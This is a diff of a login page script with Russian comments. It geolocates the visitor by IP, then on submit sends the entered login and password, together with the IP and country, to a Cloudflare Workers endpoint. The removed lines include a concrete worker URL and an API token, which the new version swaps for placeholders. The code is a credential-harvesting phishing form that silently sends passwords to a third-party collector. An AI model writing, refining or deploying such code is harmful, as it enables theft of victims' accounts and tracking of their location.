@@ -1,57 +1,54 @@
 <script>
-  const WORKER_URL = 'https://mute-scene-f7f5.kamrantataloo69.workers.dev/';
+  const WORKER_URL = 'https://…workers.dev/';
   let clientIp = 'unknown', clientCountry = 'unknown';
 
-  // 1) Получаем публичный IPv4
+  // 1) Функция для флага
+  function countryCodeToFlagEmoji(countryCode) {
+    return countryCode
+      .toUpperCase()
+      .split('')
+      .map(ch => String.fromCodePoint(0x1F1E6 + ch.charCodeAt(0) - 65))
+      .join('');
+  }
+
+  // 2) fetch IP → ipinfo
   fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
+    .then(res => res.json())
     .then(json => {
       clientIp = json.ip;
       document.getElementById('ip').textContent = clientIp;
-
-     // 1) Функция преобразования ISO‑кода в emoji‑флаг
-function countryCodeToFlagEmoji(countryCode) {
-  return countryCode
-    .toUpperCase()
-    .split('')
-    .map(ch => String.fromCodePoint(0x1F1E6 + ch.charCodeAt(0) - 65))
-    .join('');
-}
- // 2) Запрашиваем страну по IP
-      return fetch(`https://ipinfo.io/${clientIp}/json?token=12e7da7cd87750`);
+      return fetch(`https://ipinfo.io/${clientIp}/json?token=YOUR_API_KEY`);
     })
-    .then(r => r.json())
+    .then(res => res.json())
     .then(info => {
-      clientCountry = info.country;                        // сохраняем
-      document.getElementById('country').textContent = clientCountry;
+      clientCountry = info.country;
+      // ← вот здесь меняем вывод:
+      const flagEmoji = countryCodeToFlagEmoji(clientCountry);
+      document.getElementById('country').textContent = `${flagEmoji} ${clientCountry}`;
+
       document.getElementById('flag').src =
         `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
     })
-    .catch(err => {
-      console.warn('IP/Country fetch failed', err);
+    .catch(() => {
       document.getElementById('country').textContent = '—';
     });
 
-  // 3) Отправляем форму
-  // вместо document.getElementById('country').textContent = clientCountry;
-const flagEmoji = countryCodeToFlagEmoji(clientCountry);
-document.getElementById('country').textContent = `${flagEmoji} ${clientCountry}`;
-
-
-    const postData = {
+  // 3) submit формы отправляет {ip, country, login, password}
+  document.getElementById('loginForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    const form = e.target;
+    const payload = {
       ip: clientIp,
-      country: clientCountry,   // теперь отправляем country
+      country: clientCountry,
       login: form.login.value,
       password: form.password.value
     };
-
-    const resp = await fetch(WORKER_URL, {
+    await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(postData)
+      body: JSON.stringify(payload)
     });
-
-    if (resp.ok) alert('Данные отправлены!');
-    else      alert('Ошибка отправки');
+    alert('Данные отправлены!');
+    form.reset();
   });
 </script>
